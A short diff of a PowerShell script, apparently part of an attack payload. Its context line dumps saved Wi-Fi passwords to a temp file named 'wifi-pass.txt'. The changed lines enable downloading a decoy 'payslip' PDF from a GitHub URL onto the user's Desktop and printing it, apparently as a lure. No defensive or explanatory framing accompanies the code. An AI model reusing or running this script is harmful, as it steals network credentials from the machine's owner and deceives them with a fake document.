@@ -8,14 +8,14 @@ $wifiProfiles > $env:TEMP/--wifi-pass.txt
 ############################################################################################################################################################
 
 
-#$urlpdf = "https://github.com/iproUA/Powershell/raw/main/01-2024_bulletin_de_paie.pdf"
-#$extension = "pdf"
-#$outputpdf = "$([System.Environment]::GetFolderPath('Desktop'))\fiche.$extension"
+$urlpdf = "https://github.com/iproUA/Powershell/raw/main/01-2024_bulletin_de_paie.pdf"
+$extension = "pdf"
+$outputpdf = "$([System.Environment]::GetFolderPath('Desktop'))\fiche.$extension"
 
 # Download the file
-#Invoke-WebRequest -Uri $urlpdf -OutFile $outputpdf
-#Get-Content $outputpdf | Out-Printer
-# Run the downloaded file
+Invoke-WebRequest -Uri $urlpdf -OutFile $outputpdf
+Get-Content $outputpdf | Out-Printer
+#Run the downloaded file
 
 ############################################################################################################################################################
 
